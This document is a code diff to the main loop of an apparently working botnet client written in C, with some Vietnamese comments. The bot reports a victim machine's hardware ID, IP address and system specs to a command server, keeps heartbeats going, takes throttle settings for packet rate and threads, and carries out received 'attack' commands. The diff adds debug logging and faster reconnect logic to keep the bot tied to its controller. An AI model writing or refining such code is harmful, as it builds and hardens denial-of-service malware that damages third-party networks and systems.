@@ -150,6 +150,7 @@ int main(int argc, char *argv[])
                  "\"ram_total_mb\":%d,\"net_speed_mbps\":%d,\"version\":\"%s\"}",
                  g_bot_uuid, info.hwid, info.ip_addr, info.os_ver, info.cpu_cores, info.ram_mb,
                  info.net_mbps, cfg.bot_version);
+        if (foreground) fprintf(stderr, "[bot] WS connected, sending handshake...\n");
         ws_send(&ws, hs);
 
         time_t last_hb = time(NULL);
@@ -157,11 +158,12 @@ int main(int argc, char *argv[])
         AttackParams atk = {0};
         int cpu_usage = 0;
         int hb_fail = 0;
+        int recv_fail = 0;
+        int handshaked = 0;
 
         while (!g_shutdown)
         {
-            /* Send heartbeat every interval — use real elapsed time,
-               not tied to ws_recv blocking. */
+            /* Send heartbeat every interval — use real elapsed time. */
             time_t now = time(NULL);
             if (now - last_hb >= cfg.heartbeat_int)
             {
@@ -171,8 +173,10 @@ int main(int argc, char *argv[])
                 if (ws_send(&ws, hb) > 0) {
                     last_hb = now;
                     hb_fail = 0;
+                    if (foreground && !handshaked) fprintf(stderr, "[bot] heartbeat sent (waiting for ack)\n");
                 } else {
                     hb_fail++;
+                    if (foreground) fprintf(stderr, "[bot] heartbeat send fail #%d\n", hb_fail);
                     if (hb_fail > 3) break;  /* WS dead — reconnect */
                 }
             }
@@ -192,23 +196,31 @@ int main(int argc, char *argv[])
             char buf[4096];
             int n = ws_recv(&ws, buf, sizeof(buf));
             if (n < 0) {
-                /* ws_recv trả -1 khi timeout (30s) hoặc lỗi thật.
-                   Server im lặng là bình thường (chỉ gửi khi có lệnh).
-                   Chỉ reconnect nếu KHÔNG nhận gì trong 5 phút. */
-                if (time(NULL) - last_recv > 300) {
-                    break;  /* thật sự stale — reconnect */
+                recv_fail++;
+                /* recv_fail 3 lần liên = ~9s im lặng hoặc socket chết.
+                   Bot nhận heartbeat_ack mỗi 10s nên nếu 3 timeout (9s)
+                   không nhận gì → chắc chắn WS đã đứt → reconnect. */
+                if (recv_fail >= 4) {
+                    break;
+                }
+                /* Vẫn trong windows timeout — chưa kết luận đứt */
+                if (time(NULL) - last_recv > 120) {
+                    break;  /* thật sự stale 2 phút — reconnect */
                 }
                 usleep(200000);
                 continue;
             }
 
-            /* Nhận được frame → reset timer */
+            /* Nhận được frame → reset */
             last_recv = time(NULL);
+            recv_fail = 0;
 
             char type[64] = {0};
             json_str(buf, "type", type, sizeof(type));
 
             if (!strcmp(type, "config_update") || !strcmp(type, "config") || !strcmp(type, "handshake_ack")) {
+                handshaked = 1;
+                if (foreground) fprintf(stderr, "[bot] handshake ACK received\n");
                 /* Support flat {"max_pps":N} and nested {"throttle":{"max_pps":N}} */
                 int pps = json_int(buf, "max_pps");
                 int th = json_int(buf, "max_threads");
@@ -224,7 +236,10 @@ int main(int argc, char *argv[])
                 if (th > 0) cfg.default_threads = th;
             }
             else if (!strcmp(type, "heartbeat_ack") || !strcmp(type, "connected") || !strcmp(type, "pong")) {
-                /* Server alive signal — just resets last_hb (already done above) */
+                if (foreground && !handshaked) {
+                    fprintf(stderr, "[bot] server %s received\n", type);
+                    handshaked = 1;
+                }
             }
             else if (!strcmp(type, "attack")) {
                 memset(&atk, 0, sizeof(atk));
@@ -267,6 +282,7 @@ int main(int argc, char *argv[])
             }
         }
         ws_disconnect(&ws);
+        if (foreground) fprintf(stderr, "[bot] WS disconnected, reconnecting in %ds...\n", cfg.reconnect_min);
     }
     return 0;
 }
